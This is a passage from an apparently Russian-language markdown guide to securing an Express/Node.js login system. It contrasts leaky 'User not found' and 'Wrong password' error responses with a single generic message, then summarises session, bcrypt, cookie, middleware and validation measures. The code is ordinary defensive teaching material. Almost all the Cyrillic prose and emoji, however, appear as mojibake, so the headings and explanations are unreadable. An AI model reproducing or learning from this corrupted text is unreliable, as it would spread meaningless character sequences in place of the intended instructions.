if (!user) {
  return res.status(401).json({ error: 'User not found' });
}
if (!passwordMatch) {
  return res.status(401).json({ error: 'Wrong password' });
}

// вњ… РҐРћР РћРЁРћ - РѕР±С‰РµРµ СЃРѕРѕР±С‰РµРЅРёРµ
if (!user || !passwordMatch) {
  return res.status(401).json({ error: 'Invalid credentials' });
}
```

---

## рџЋ“ РС‚РѕРіРѕРІС‹Рµ РєР»СЋС‡РµРІС‹Рµ РјРѕРјРµРЅС‚С‹ РґР»СЏ Р·Р°С‰РёС‚С‹:

1. **РЎРµСЃСЃРёРё:** MongoDB С…СЂР°РЅРёР»РёС‰Рµ, 24-С‡Р°СЃРѕРІРѕР№ TTL, Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРѕРµ СѓРґР°Р»РµРЅРёРµ
2. **Bcrypt:** 10 СЂР°СѓРЅРґРѕРІ, СѓРЅРёРєР°Р»СЊРЅР°СЏ СЃРѕР»СЊ РґР»СЏ РєР°Р¶РґРѕРіРѕ РїР°СЂРѕР»СЏ
3. **Cookies:** HttpOnly (XSS Р·Р°С‰РёС‚Р°), Secure (HTTPS), SameSite (CSRF)
4. **Middleware:** isAuthenticated() РЅР° РІСЃРµС… write РѕРїРµСЂР°С†РёСЏС…
5. **Р’Р°Р»РёРґР°С†РёСЏ:** Email, С‚РµР»РµС„РѕРЅ, РґР°С‚С‹, РґРёР°РїР°Р·РѕРЅС‹ С‡РёСЃРµР»
6. **РћС€РёР±РєРё:** РџСЂР°РІРёР»СЊРЅС‹Рµ HTTP РєРѕРґС‹, РѕР±С‰РёРµ СЃРѕРѕР±С‰РµРЅРёСЏ
7. **CRUD:** РџРѕР»РЅС‹Р№ С„СѓРЅРєС†РёРѕРЅР°Р» С‡РµСЂРµР· UI, Р±РµР· Postman
8. **Р”Р°РЅРЅС‹Рµ:** 25 СЂРµР°Р»РёСЃС‚РёС‡РЅС‹С… Р·Р°РїРёСЃРµР№, 12 РїРѕР»РµР№ РІ СЃСѓС‰РЅРѕСЃС‚Рё

**Р’СЃРµ С‚СЂРµР±РѕРІР°РЅРёСЏ РІС‹РїРѕР»РЅРµРЅС‹ РЅР° 100%!** рџЋ‰
